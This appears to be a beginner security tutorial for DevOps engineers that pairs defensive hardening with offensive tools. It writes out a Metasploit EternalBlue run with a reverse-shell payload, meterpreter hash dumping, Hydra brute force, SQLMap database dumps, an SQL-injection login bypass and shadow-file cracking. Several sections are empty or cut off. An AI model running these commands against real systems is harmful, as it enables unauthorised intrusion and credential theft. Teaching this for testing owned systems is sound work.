PAGE 01 — FOUNDATION

The Security Mindset

Before touching any tool, you need to think like an attacker AND a defender. This duality is what separates good DevOps engineers from great ones.

🧠
Foundation
Think Like Both: Attacker & Defender
Layman ExplanationImagine you own a house. An attacker thinks "How do I break in?" — weak door lock? Open window? Disguise as delivery guy? A defender thinks "How do I stop someone from breaking in?" — better lock, alarm, camera. Security people must think BOTH ways. In tech: attackers find holes; defenders patch them.
RED TEAM (Attacker)
  • Find vulnerabilities before attackers do
  • Simulate real-world attacks
  • Penetration testing, social engineering
  • "How would I break this?"
BLUE TEAM (Defender)
  • Monitor, detect, and respond to threats
  • Patch vulnerabilities discovered
  • Set up firewalls, IDS, SIEM
  • "How do I stop this?"
PURPLE TEAM (Both)
  • Red + Blue working together
  • Attack AND defend simultaneously
  • Best for DevOps engineers
  • "How do I build securely from day one?"
CIA Triad
The 3 Pillars of Security
LaymanEvery security decision maps to one of 3 goals: keeping data secret (C), making sure data isn't tampered (I), and ensuring systems are always available (A).
  • Confidentiality — Only authorized people see data. (Encryption, access control)
  • Integrity — Data hasn't been tampered with. (Hashing, checksums)
  • Availability — Systems are up when needed. (Backups, DDoS protection)
Know This
The Attack Lifecycle
LaymanHackers don't just randomly attack. They follow a methodical process — like a burglar who first watches the neighborhood, then picks a target, then plans the break-in.
1
Reconnaissance
Gather info about target (passive/active)
2
Scanning & Enumeration
Find open ports, services, vulnerabilities
3
Exploitation
Use discovered vulnerabilities to gain access
4
Post-Exploitation
Maintain access, escalate privileges, exfiltrate
PAGE 02 — NETWORKING BASICS

Networking for Security

You cannot hack or defend what you don't understand. Networking is the foundation of everything in cybersecurity.

🌐
Why DevOps Engineers MUST Know Networking
Every attack travels through a network. Firewalls, IDS, VPNs, SSL — all network concepts. If you don't know TCP/IP, ports, and protocols, you're flying blind when securing your infrastructure.
Concept
TCP/IP & Ports
LaymanIP address = your house address. Port = the specific door in your house. Port 80 is the front door (HTTP). Port 443 is the secure front door (HTTPS). Port 22 is the back door (SSH). Attackers knock on all doors to find unlocked ones.
PortServiceSecurity Note
22SSHChange default port, disable root login
80HTTPUnencrypted — use HTTPS instead
443HTTPSEncrypted — always use this
3306MySQLNever expose to internet!
5432PostgreSQLBlock at firewall level
6379RedisNo auth by default — dangerous!
27017MongoDBHistorically exposed unprotected
Concept
Key Protocols Explained
LaymanProtocols are rules for how two computers talk. Like human languages — if both sides speak the same one, they understand each other. Attackers exploit weaknesses in these "languages."
ProtocolPlain EnglishSecurity Risk
TCPReliable, ordered deliverySYN flood attacks
UDPFast, no guarantee deliveryDDoS amplification
DNSPhone book of the internetDNS poisoning, hijacking
ARPMaps IP to MAC addressARP spoofing/poisoning
ICMPPing — is a host alive?Ping flood, smurf attack
SMTPEmail sendingEmail spoofing, spam relays
Basic Network Commands (Linux)
# Show your IP addresses
ip addr show
ifconfig # older method

# Test connectivity
ping 8.8.8.8 # ping Google DNS
ping -c 4 google.com # 4 packets only

# Trace the route packets take
traceroute google.com
tracepath google.com # no sudo needed

# DNS lookup
nslookup google.com
dig google.com # detailed DNS info
dig +short google.com # just IP

# Show open connections
ss -tulpn # all listening ports
netstat -tulpn # older equivalent
Subnetting & CIDR (Quick)
LaymanCIDR is how we define a "neighborhood" of IP addresses. /24 means 256 addresses in your neighborhood. Firewalls use this to say "allow everyone from this neighborhood, block everyone else."
# Common CIDR ranges:
192.168.1.0/24 # 256 IPs (home network)
10.0.0.0/8 # 16M IPs (large corp)
172.16.0.0/12 # 1M IPs (mid corp)

# Check if IP is in subnet:
ipcalc 192.168.1.0/24

# Understand: /32 = single IP
# /0 = entire internet (dangerous!)

# Route table
ip route show
route -n # numeric format
PAGE 03 — LINUX SECURITY

Linux Security Basics

Linux is the OS of DevOps. Securing it is non-negotiable. Start here before using any security tools.

Must Know
Users, Permissions & Sudo
LaymanLinux is like an office building. Root is the building manager with master key. Regular users have keys only to their own offices. Sudo is like temporarily borrowing the master key. Always follow least privilege — people should only access what they need.
# Who am I?
whoami
id # full user info

# List users
cat /etc/passwd
getent passwd

# Create non-root user
useradd -m deployuser
usermod -aG sudo deployuser

# Check file permissions
ls -la /etc/passwd
# rwxr-xr-x = owner/group/others

# Fix bad permissions
chmod 600 ~/.ssh/id_rsa # private key
chmod 700 ~/.ssh # .ssh folder
Critical
SSH Hardening
LaymanSSH is the remote door to your server. By default, it's like having a door that accepts anyone who knows a password. Hardening means: change the door number, require a special key card (not just password), and ban root access.
# Edit SSH config
sudo vim /etc/ssh/sshd_config

# Key settings to change:
Port 2222 # NOT default 22
PermitRootLogin no # disable root SSH
PasswordAuthentication no # keys only!
MaxAuthTries 3 # limit attempts
AllowUsers deployuser # whitelist users

# Restart SSH after changes
sudo systemctl restart sshd

# Generate SSH key pair
ssh-keygen -t ed25519 -C "mykey"
# Copy to server:
ssh-copy-id user@server
Hardened SSH
  • Key-based auth — nearly unbreakable
  • No brute force possible
Risks
  • Lose your key = locked out
  • Always keep backup access method
System Monitoring
Logs & Audit Trails
LaymanLogs are your security cameras. Every login, every command run as sudo, every failed attempt — it's recorded. When something bad happens, logs tell you who did what and when.
# Key log files to know:
tail -f /var/log/auth.log # SSH logins
tail -f /var/log/syslog # system events
tail -f /var/log/nginx/access.log

# Search logs for failed logins:
grep "Failed password" /var/log/auth.log

# Find all sudo usage:
grep "sudo" /var/log/auth.log

# Install auditd for deep audit
sudo apt install auditd
auditctl -w /etc/passwd -p wa # watch file
ausearch -f /etc/passwd
PAGE 04 — RECON TOOL

Nmap — Network Mapper

The most important reconnaissance tool. Tells you what's running on any network. Every DevOps & security engineer uses this daily.

🗺️
Free & Open Source
Nmap: Your Network X-Ray Machine
Layman ExplanationImagine you're a security guard doing a walkthrough of a building. Nmap is your scanner — it goes to every room (port), knocks on the door, and reports back: "Room 80 is open, someone named 'nginx' is inside. Room 22 is open, someone named 'OpenSSH' is there. Room 3306 is locked." You get a complete picture of what's running on any system before you even log in.
Pros
  • Free, powerful, industry standard
  • Works on any OS
  • Detects services & versions
  • Scriptable with NSE scripts
  • Used by both attackers AND defenders
Cons / Warnings
  • Scanning networks you don't own = illegal
  • Loud scans can trigger IDS/IPS alerts
  • Full port scans take time
  • Some firewalls block/deceive Nmap
Basic Scans
Essential Nmap Commands
# Install Nmap
sudo apt install nmap

# Basic host scan — is it alive?
nmap 192.168.1.1

# Scan top 1000 ports (default)
nmap 192.168.1.1

# Scan specific port
nmap -p 80 192.168.1.1

# Scan port range
nmap -p 1-1000 192.168.1.1

# Scan ALL 65535 ports
nmap -p- 192.168.1.1

# Scan entire subnet
nmap 192.168.1.0/24

# Skip host discovery (assume alive)
nmap -Pn 192.168.1.1
Advanced Scans
Service & OS Detection
# Detect service versions (-sV)
nmap -sV 192.168.1.1
# Result: 22/tcp open ssh OpenSSH 8.2

# Detect OS (-O)
nmap -O 192.168.1.1
# Needs sudo

# Aggressive scan (-A) = sV+O+scripts+traceroute
nmap -A 192.168.1.1

# SYN scan (stealth, needs sudo)
sudo nmap -sS 192.168.1.1

# UDP scan (slow but important)
sudo nmap -sU 192.168.1.1

# Save output to file
nmap -oN output.txt 192.168.1.1
nmap -oX output.xml 192.168.1.1 # XML

# Run NSE vulnerability scripts
nmap --script vuln 192.168.1.1
Real World Use
DevOps Use Cases
LaymanBefore deploying to production, run Nmap on your own servers to verify: are any unexpected ports open? Did your database accidentally expose itself to the internet?
# Audit your own server after deploy:
nmap -sV -p- your-server-ip

# Quick scan for top 100 ports
nmap -F your-server-ip

# Check if a specific service is exposed
nmap -p 3306,5432,6379 your-server-ip
# If these show open = DANGER!

# Verify firewall rules work:
nmap -Pn --open your-server-ip
# Only shows actually open ports
⚠️ Only scan systems you own or have written permission to scan. Unauthorized scanning is illegal.
PAGE 05 — PACKET ANALYSIS

Wireshark & tcpdump

Packet analyzers — see every single byte traveling across your network in real time. Essential for debugging and detecting attacks.

🔬
Network Microscope
Wireshark shows you every packet on your network — like reading every letter in every envelope passing through your mail room. You can see usernames, passwords (on unencrypted connections), and attack patterns live. Critical for detecting intrusions and debugging network issues.
GUI Tool
Wireshark — Visual Analysis
LaymanWireshark has a visual interface. You click "Start Capture" and watch packets fly by in real time. You can filter for just HTTP traffic, just a specific IP, just passwords — incredibly powerful for learning and investigation.
# Install Wireshark
sudo apt install wireshark

# Run with sudo (or add to wireshark group)
sudo wireshark

# Key Display Filters in Wireshark GUI:
http # show only HTTP
http.request # HTTP requests only
ip.addr == 192.168.1.5 # specific IP
tcp.port == 443 # HTTPS traffic
dns # DNS queries
ftp # FTP (sends passwords clear!)
tcp contains "password" # keyword search
!(arp or dns) # exclude noise
CLI Tool
tcpdump — Terminal Packet Capture
Laymantcpdump is Wireshark for the terminal — no GUI needed. Essential on servers where you don't have a desktop. You can capture packets, save them, and analyze later in Wireshark.
# Install tcpdump
sudo apt install tcpdump

# Capture all traffic on interface
sudo tcpdump -i eth0

# Capture specific port
sudo tcpdump -i eth0 port 80

# Capture traffic from specific IP
sudo tcpdump -i eth0 host 192.168.1.5

# Save to file (open in Wireshark)
sudo tcpdump -i eth0 -w capture.pcap

# Read saved file
sudo tcpdump -r capture.pcap

# Show packet contents (verbose)
sudo tcpdump -i eth0 -A port 80
# -A prints ASCII content — see passwords!
Detecting Attacks with Packet Analysis
# Detect ARP poisoning (MitM attack)
sudo tcpdump -i eth0 arp
# Look for: same IP with 2 different MACs

# Detect port scan (many SYN packets)
sudo tcpdump -i eth0 'tcp[tcpflags] == tcp-syn'

# Detect DNS exfiltration
sudo tcpdump -i eth0 port 53 -v
# Unusually large DNS queries = red flag

# Monitor specific protocol
sudo tcpdump -i eth0 icmp # ping traffic
Security Warning
Why Encrypt Everything
LaymanAnyone on the same network can run Wireshark and read your traffic if it's unencrypted. Hotel WiFi, coffee shop, corporate network — all vulnerable. This is why HTTPS, SSH, and VPN exist.
🚨 HTTP sends passwords, cookies, and data in plain text. Anyone on the same network can steal them with Wireshark. ALWAYS use HTTPS.
  • Never use HTTP for anything sensitive
  • Use SSH, not Telnet (Telnet is plain text)
  • Use SFTP, not FTP (FTP sends passwords plain)
  • On public WiFi, always use VPN
  • Encrypt your API keys in transit AND at rest
PAGE 06 — WEB HACKING

Burp Suite

The #1 web application security testing tool. Every web security professional uses this.

🕷️
Industry Standard
Burp Suite: Web Traffic Interceptor
Layman ExplanationWhen you use a website, your browser sends requests and gets responses. Burp Suite sits in the middle — like a translator who reads and can modify every message. You can intercept a login form, change your username from "alice" to "admin", and see what happens. You can replay requests, change parameters, test for SQL injection — all through a clean interface.
KEY MODULES
  • Proxy — Intercept & modify HTTP requests in real time
  • Repeater — Replay and modify saved requests manually
  • Intruder — Automated attack tool (fuzzing, brute force)
  • Scanner — Auto-scan for vulnerabilities (Pro version)
  • Decoder — Encode/decode Base64, URL, HTML, etc.
  • Comparer — Diff two responses to spot differences
Pros
  • Best-in-class web testing
  • Free community edition available
  • Industry standard — every job asks for it
  • Powerful proxy & fuzzing
Cons
  • Pro version is expensive ($449/year)
  • Steep learning curve
  • Community version has limits
Setup
Burp Suite Setup
1
Download & Launch
Get Community Edition free from portswigger.net. Run Java JAR or installer. Start "Temporary Project".
2
Configure Browser Proxy
Set browser proxy to 127.0.0.1:8080. Or use Burp's built-in Chromium browser (easiest).
3
Install CA Certificate
Visit http://burp, download cert, install in browser. This lets Burp intercept HTTPS.
4
Enable Intercept
Proxy → Intercept → Intercept is ON. Now every request pauses for you to inspect.
Common Tests
What DevOps Engineers Test
LaymanAs a DevOps engineer, you use Burp to verify your web app is secure before deploying — like a pre-flight checklist. Test that authentication works, cookies are secure, and inputs are validated.
  • Test login forms — Can I bypass with SQL injection? Try: ' OR 1=1--
  • Cookie inspection — Are session cookies marked HttpOnly & Secure?
  • IDOR testing — Change user ID in URL from 1 to 2 — can I see other users?
  • Header testing — Is X-Frame-Options set? Content-Security-Policy?
  • Auth bypass — Can I access /admin without logging in?
  • File upload — Can I upload a PHP shell instead of an image?
PAGE 07 — EXPLOITATION

Metasploit Framework

The world's most used penetration testing framework. Thousands of pre-built exploits for known vulnerabilities.

💣
⚠️ Legal Warning — Only on Systems You Own or Have Permission
Metasploit is a powerful exploitation framework. Using it against systems without authorization is a criminal offense. Use it on your own test lab, virtual machines (HackTheBox, TryHackMe, DVWA), or with explicit written permission from the system owner.
Framework
Metasploit Basics
LaymanMetasploit is like a toolbox of lockpicks for every known lock. Someone found a vulnerability in Windows XP? There's a Metasploit module for it. You just pick the exploit, set the target IP, and fire. The framework handles all the technical complexity of the actual exploit.
# Install on Kali/Parrot Linux (pre-installed)
sudo apt install metasploit-framework

# Start Metasploit console
msfconsole

# Basic workflow:
msf6> search eternalblue # find exploit
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> show options # see required fields
msf6> set RHOSTS 192.168.1.10 # target IP
msf6> set LHOST 192.168.1.5 # your IP
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> run # launch exploit
Post-Exploitation
Meterpreter Shell
LaymanIf the exploit works, you get a Meterpreter shell — like having a remote control for the target computer. You can run commands, upload/download files, escalate to admin. Defenders need to know what attackers do post-exploitation to properly defend.
# Once you have a Meterpreter session:
meterpreter> sysinfo # system info
meterpreter> getuid # current user
meterpreter> getsystem # escalate to SYSTEM
meterpreter> hashdump # dump password hashes
meterpreter> shell # get cmd shell
meterpreter> screenshot # take screenshot
meterpreter> upload file.txt # upload file
meterpreter> download /etc/passwd
meterpreter> run post/linux/gather/enum_system
🔴 This is why patching is critical. EternalBlue exploited an unpatched Windows SMB. Patch. Everything. Always.
PAGE 08 — WEB SCANNER

Nikto — Web Vulnerability Scanner

A free, fast web server scanner that checks for thousands of dangerous files, misconfigurations, and vulnerabilities.

Free Tool
What Nikto Does
LaymanNikto is an automated web inspector. It visits your website and checks thousands of known dangerous locations — like checking if your admin panel is accidentally public, if you have default passwords, or if old vulnerable software versions are running. Think of it as an automated security audit for websites.
# Install Nikto
sudo apt install nikto

# Basic scan
nikto -h http://target.com

# Scan specific port
nikto -h http://target.com -p 8080

# Scan HTTPS
nikto -h https://target.com -ssl

# Save output to HTML
nikto -h target.com -o report.html -Format htm

# Tune scan (1=interesting, 2=misconfig, 4=injection...)
nikto -h target.com -Tuning 1234
Pros
  • Free & fast
  • 6700+ checks included
  • Good for quick audits
Cons
  • Very noisy — easily detected
  • Many false positives
  • Not stealthy at all
Common Findings
What Nikto Finds
  • Default/exposed admin panels (/admin, /wp-admin, /phpmyadmin)
  • Server version disclosure in headers (X-Powered-By: PHP/5.6)
  • Missing security headers (X-Frame-Options, CSP, HSTS)
  • Outdated software versions with known CVEs
  • Test files left on server (/test.php, /backup.zip)
  • Directory listing enabled (can browse all files)
  • Default credentials on admin areas
  • Dangerous HTTP methods (DELETE, PUT, TRACE) enabled
💡 Run Nikto on your own web apps before deploying. Fix what it finds. This is basic DevSecOps hygiene.

PAGE 10 — PASSWORD CRACKING

Hashcat — Password Cracking

The world's fastest password recovery tool. GPU-accelerated. Essential for testing password policy strength.

🔑
Why DevOps Engineers Need to Know This
When a database breach happens and password hashes are leaked, attackers run Hashcat to recover the actual passwords. You need to know how fast/easy your hash algorithm can be cracked — so you choose the right algorithm (bcrypt, not MD5!) and enforce strong password policies.
Critical
Understanding Password Hashing
LaymanPasswords should never be stored as plain text. Instead, they're run through a hash function that produces a jumbled output. "password123" → "482c811da5d5b4bc6d497ffa98491e38". The trick: given a hash, you can't reverse it — but you can try millions of guesses and see if any match.
AlgorithmSpeed (GPU)Security
MD564 billion/secBROKEN — never use
SHA-120 billion/secDeprecated — avoid
SHA-25610 billion/secOK for files, not passwords
bcrypt184/secEXCELLENT — use this
Argon2100/secBEST — modern choice
Commands
Hashcat Usage
# Install hashcat
sudo apt install hashcat

# Identify hash type first
hashid '482c811da5d5b4bc6d497ffa98491e38'
# or use hash-identifier tool

# Dictionary attack (most common)
# -m 0 = MD5, -a 0 = dictionary attack
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Brute force (all combinations)
hashcat -m 0 -a 3 hash.txt '?a?a?a?a?a?a'
# ?a = any char, 6 characters long

# Common hash type codes:
# -m 0 = MD5, -m 100 = SHA-1
# -m 1800 = sha512crypt (Linux /etc/shadow)
# -m 3200 = bcrypt
Defense
How to Defend Against Password Cracking
  • Always use bcrypt or Argon2 — never MD5/SHA-1 for passwords
  • Add salt — unique random string per password prevents rainbow tables
  • Enforce minimum 12 characters — longer = exponentially harder to crack
  • Require complexity — mix upper, lower, numbers, symbols
  • Implement account lockout after N failed attempts
  • Use MFA — even cracked password is useless without the second factor
  • Check passwords against HaveIBeenPwned database on registration
PAGE 11 — PASSWORD CRACKING

John the Ripper

Classic password cracker. Excellent for Linux /etc/shadow files and various hash formats. Simpler than Hashcat for quick tasks.

Classic Tool
John the Ripper Basics
LaymanJohn is the simpler cousin of Hashcat. Great for quickly cracking common Linux password formats. Auto-detects the hash type, which is a massive convenience. Often the first tool to try when you find a hash file.
# Install John
sudo apt install john

# Auto-detect and crack
john hashes.txt

# Use wordlist (rockyou.txt is the famous one)
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack /etc/shadow Linux passwords
sudo cat /etc/shadow > shadow.txt
john --wordlist=rockyou.txt shadow.txt

# Crack ZIP password
zip2john secret.zip > zip.hash
john zip.hash
Wordlists
rockyou.txt & Other Wordlists
Laymanrockyou.txt is a famous list of 14 million real passwords leaked from a 2009 breach. Most people use weak, predictable passwords. Attackers try these known passwords first — called a dictionary attack. If your password is on this list, it'll be cracked in seconds.
# Find wordlists on Kali:
ls /usr/share/wordlists/

# Extract rockyou.txt (it's compressed)
gunzip /usr/share/wordlists/rockyou.txt.gz

# Line count (14 million passwords!):
wc -l /usr/share/wordlists/rockyou.txt

# SecLists — comprehensive wordlists collection
sudo apt install seclists
ls /usr/share/seclists/
PAGE 12 — BRUTE FORCE

Hydra — Online Brute Force

Network login cracker. Brute forces live services — SSH, FTP, HTTP logins, databases — over the network.

Offensive Tool
Hydra Fundamentals
LaymanHydra tries millions of username/password combinations against live services — like trying every key on a keyring against a lock, very fast. The difference from Hashcat: Hydra attacks live services (SSH, web logins) over the network. Hashcat cracks offline hash files.
# Install Hydra
sudo apt install hydra

# Brute force SSH
hydra -l root -P rockyou.txt 192.168.1.10 ssh
# -l = single username, -L = username list
# -p = single password, -P = password list

# Brute force FTP
hydra -l admin -P pass.txt ftp://192.168.1.10

# Brute force web login form
hydra -l admin -P pass.txt 192.168.1.10 \
http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Speed up with multiple threads
hydra -l admin -P pass.txt -t 64 ssh://target
Defense
Defending Against Brute Force
LaymanBrute force attacks are loud and obvious — your logs will show thousands of failed login attempts from one IP. The defense is simple: rate limiting, lockout, and fail2ban (auto-bans IPs that fail too many times).
# Install fail2ban (auto-bans brute-forcers)
sudo apt install fail2ban

# Configure /etc/fail2ban/jail.conf
[ssh]
enabled = true
port = ssh
maxretry = 3 # ban after 3 failures
bantime = 3600 # banned for 1 hour
findtime = 600 # within 10 minutes

# Restart fail2ban
sudo systemctl restart fail2ban

# Check banned IPs
sudo fail2ban-client status ssh
Also Do This
  • Disable password auth, use SSH keys
  • Rate limit login endpoints
  • Implement MFA
Brute Force Signs
  • Thousands of failed logins in logs
  • Slow server response
  • Same IP, many usernames
PAGE 13 — DIRECTORY ENUMERATION

Gobuster & Dirb

Directory and file brute-forcing tools. Find hidden pages, admin panels, and backup files that developers forgot to protect.

Fast & Free
Gobuster — Directory Brute Force
LaymanWeb servers have many pages — some public, some meant to be secret. Gobuster tries thousands of common names against your site: /admin, /backup, /config, /test, etc. If any exist (even without a link), it finds them. Developers often forget hidden pages that expose sensitive data.
# Install gobuster
sudo apt install gobuster

# Basic directory scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Scan for specific extensions
gobuster dir -u http://target.com \
-w common.txt -x php,txt,html,bak

# Increase threads (faster)
gobuster dir -u http://target.com \
-w common.txt -t 50

# DNS subdomain enumeration
gobuster dns -d target.com \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Save output
gobuster dir -u http://target.com -w common.txt -o results.txt
What Gets Found
Common Dangerous Findings
  • /admin — Admin panel accidentally exposed
  • /backup.zip — Full site backup downloadable by anyone
  • /.git — Git repository exposed (source code + secrets!)
  • /phpinfo.php — PHP configuration reveals system info
  • /config.php.bak — Config backup with DB passwords
  • /.env — Environment file with API keys
  • /wp-admin — WordPress admin (often brute-forced)
  • /test.php — Test files developers forgot to remove
🚨 Exposed .git directory = GAME OVER. Attacker can download your entire source code, commit history, and any secrets ever committed.
PAGE 14 — SQL INJECTION

SQLMap — SQL Injection Automation

The most dangerous web vulnerability, automated. SQL injection still ranks as the #1 web attack vector.

💉
SQL Injection — The Exploit That Shouldn't Still Exist
SQL injection has been known since 1998. Yet it remains #1 in OWASP Top 10. It happens when user input is directly embedded in SQL queries. SQLMap automates finding and exploiting these vulnerabilities — and can dump entire databases in seconds.
Critical Concept
What is SQL Injection?
LaymanA web app asks: "What's your username?" and uses your answer in a database query. Normally: SELECT * FROM users WHERE name='alice'. If you enter alice' OR 1=1--, the query becomes: SELECT * FROM users WHERE name='alice' OR 1=1--' which returns ALL users. You just bypassed authentication.
# Install sqlmap
sudo apt install sqlmap

# Basic test on URL parameter
sqlmap -u "http://target.com/page?id=1"

# Detect and enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump specific database tables
sqlmap -u "http://target.com/page?id=1" \
-D mydb --tables

# Dump specific table (e.g., users)
sqlmap -u "http://target.com/page?id=1" \
-D mydb -T users --dump

# Test POST request (login form)
sqlmap -u "http://target.com/login" \
--data "user=admin&pass=test"
Defense
Preventing SQL Injection (For Developers)
LaymanThe fix is simple: never put user input directly into SQL strings. Use "prepared statements" — pre-made query templates where user input is treated as data, never as SQL code. One code change eliminates the entire attack class.
# VULNERABLE code (never do this):
query = "SELECT * FROM users WHERE name='" + username + "'"

# SAFE — Parameterized/Prepared Statement:
# Python (psycopg2)
cursor.execute(
"SELECT * FROM users WHERE name = %s",
(username,)
)

# Node.js (pg)
pool.query(
'SELECT * FROM users WHERE name = $1',
[username]
)
  • Use ORMs (they parameterize automatically)
  • Validate and sanitize ALL user input
  • Use WAF (Web Application Firewall)
  • Least-privilege DB user (read-only where possible)

PAGE 17 — DEFENSE

Firewalls — UFW & iptables

Your first line of defense. Control what traffic enters and leaves your servers.

🧱
Firewall = Traffic Controller
A firewall is like a security checkpoint at your server's entrance. It looks at every packet trying to get in or out and decides: allowed or denied? Based on IP, port, protocol, and direction. The most critical security control after authentication.
Beginner-Friendly
UFW — Uncomplicated Firewall
LaymanUFW is a simplified firewall manager — it wraps iptables (complex) with simple commands. Great for most DevOps use cases. "Allow port 80. Allow port 443. Deny everything else." Simple and effective.
# Install & enable UFW
sudo apt install ufw
sudo ufw enable

# Default: deny all in, allow all out
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Allow specific ports
sudo ufw allow 22/tcp # SSH
sudo ufw allow 80/tcp # HTTP
sudo ufw allow 443/tcp # HTTPS

# Allow from specific IP only
sudo ufw allow from 192.168.1.5 to any port 22

# Block an IP
sudo ufw deny from 1.2.3.4

# Check status
sudo ufw status verbose
Advanced
iptables — Raw Firewall Power
Laymaniptables is the actual firewall engine in Linux. UFW is just a wrapper. iptables gives you complete control — but requires more knowledge. When you need complex rules (port forwarding, NAT, advanced filtering), iptables is the tool.
# List all rules
sudo iptables -L -v -n

# Allow established connections
sudo iptables -A INPUT -m state \
--state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH
sudo iptables -A INPUT -p tcp \
--dport 22 -j ACCEPT

# Drop everything else
sudo iptables -A INPUT -j DROP

# Save rules (persist on reboot)
sudo iptables-save > /etc/iptables/rules.v4
PAGE 18 — FIREWALL ADVANCED

iptables Deep Dive & nftables

Chains, tables, rules — how the Linux packet filtering engine actually works.

Architecture
iptables Architecture
Laymaniptables has 3 main chains (checkpoints). INPUT = traffic coming TO your server. OUTPUT = traffic leaving your server. FORWARD = traffic passing THROUGH your server (router use). Each chain has rules evaluated top to bottom. First match wins.
ChainWhen UsedCommon Use
INPUTPackets destined for this hostBlock/allow inbound connections
OUTPUTPackets leaving this hostBlock outbound connections
FORWARDPackets routing through hostUsed in routers/gateways
PREROUTINGBefore routing decisionPort forwarding, NAT
POSTROUTINGAfter routing decisionMasquerade/SNAT
Modern Way
nftables — The Future
Laymannftables is the modern replacement for iptables. Cleaner syntax, better performance, replaces iptables+ip6tables+arptables all in one. New Linux distributions are switching to nftables. Learn this for future-proofing.
# Install nftables
sudo apt install nftables

# List all rules
sudo nft list ruleset

# Create basic firewall ruleset
sudo nft add table inet filter
sudo nft add chain inet filter input \
{ type filter hook input priority 0 \; policy drop \; }

# Allow SSH
sudo nft add rule inet filter input \
tcp dport 22 accept

# Allow HTTP/HTTPS
sudo nft add rule inet filter input \
tcp dport { 80, 443 } accept

PAGE 20 — INTRUSION DETECTION

IDS/IPS — Snort & Suricata

Intrusion Detection & Prevention Systems. Watch network traffic in real time and alert (IDS) or block (IPS) suspicious activity.

IDS vs IPS
Detection vs Prevention
LaymanIDS is like a burglar alarm — it detects and screams. IPS is like an automated door that slams shut — it detects AND blocks. IDS watches traffic and logs suspicious activity. IPS actually blocks malicious traffic in real time. For production, you want IPS mode.
IDS Mode
  • Zero risk of blocking legit traffic
  • Learn what's normal first
  • Log and alert only
  • Passive monitoring
IPS Mode
  • Blocks attacks automatically
  • Risk of false positives blocking users
  • Active intervention
  • Lower latency than manual response

Writing Rules
Custom Detection Rules
LaymanSuricata rules are like "if you see THIS pattern in network traffic, do THAT action." You can write rules to detect port scans, SQL injection attempts, known malware signatures — anything.
# Suricata rule syntax:
# action protocol src_ip src_port -> dst_ip dst_port (options)

# Alert on any ICMP ping
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping"; sid:1001;)

# Alert on SQL injection attempt
alert http any any -> any 80 (
msg:"SQL Injection Attempt";
content:"OR 1=1"; nocase;
sid:1002;)

# Block (IPS mode) port scan
drop tcp any any -> $HOME_NET any (
detection_filter: track by_src, count 50, seconds 1;
msg:"Port Scan"; sid:1003;)

SSL/TLS & OpenSSL

🔐
Critical Skill
SSL/TLS: The Encryption Handshake
Layman ExplanationWhen you visit https://bank.com, before any data is sent, your browser and the bank do a "handshake" — like a secret greeting that proves the bank is real (not a fake site) and sets up an encrypted tunnel. Nobody between you and the bank can read the data. This is TLS. SSL is the old, broken version. Always use TLS 1.2 or 1.3 minimum.

Essential OpenSSL Usage

Secrets Management

API keys, passwords, and certificates in code = the #1 DevOps security mistake. Here's how to do it right.

🗝️
The #1 DevOps Security Mistake
Every year, thousands of developers accidentally commit API keys, database passwords, and SSH keys to GitHub. GitHub scans for these automatically now, but it's too late — bots scrape new commits in seconds. Never commit secrets. Period. Use a proper secrets manager.
Prevention First
git-secrets & Pre-commit Hooks
Laymangit-secrets scans your code BEFORE you commit — like spell check but for secrets. If it finds an AWS key, database URL, or private key, it refuses to let you commit. Install it globally and forget about accidental leaks.
# Install git-secrets
sudo apt install git-secrets
# or: brew install git-secrets

# Register AWS patterns (blocks AWS keys)
git secrets --register-aws

# Install globally (all repos)
git secrets --install ~/.git-templates/git-secrets
git config --global init.templateDir ~/.git-templates/git-secrets

# Scan existing repo for secrets
git secrets --scan
git secrets --scan-history # scan all commits!

# Also try: trufflehog (finds secrets in git history)
pip install trufflehog
trufflehog git https://github.com/yourrepo
Best Practice
HashiCorp Vault
LaymanVault is a secret bank vault for your infrastructure. Instead of hardcoding passwords, apps ask Vault "give me the DB password" with their identity token. Vault gives a temporary secret that expires. If breached, the secret is already expired. Centralized, audited, and secure.
# Start Vault dev server (learning)
vault server -dev

# Store a secret
vault kv put secret/myapp \
db_password="supersecret" \
api_key="key123"

# Read a secret
vault kv get secret/myapp

# Read specific field
vault kv get -field=db_password secret/myapp

# Dynamic secrets (DB: create temp credentials)
vault read database/creds/my-role
# Returns: username + temp password (TTL: 1hr)

IAM Security
Identity & Access Management
LaymanIAM is the permission system for everything in the cloud. The golden rule: least privilege — give every service, user, and role only the minimum permissions needed. Most cloud breaches start with an over-permissioned IAM role.
  • Enable MFA on root account and all admin users
  • Never use root account for day-to-day work
  • Use IAM roles for EC2/Lambda — not access keys in code!
  • Rotate access keys every 90 days, delete unused ones
  • Enable AWS GuardDuty / GCP Security Command Center
  • Use SCPs (Service Control Policies) to enforce org-wide limits
  • Enable Access Analyzer to find overly permissive policies
⚠️ An S3 bucket accidentally set to public has leaked millions of customer records from Fortune 500 companies. Always verify S3 public access settings.

The 6 Phases of Incident Response
1
Preparation
BEFORE an incident: backups tested, SIEM configured, IR plan documented, communication tree ready, tools pre-installed.
2
Identification

Eradication

6
Lessons Learned
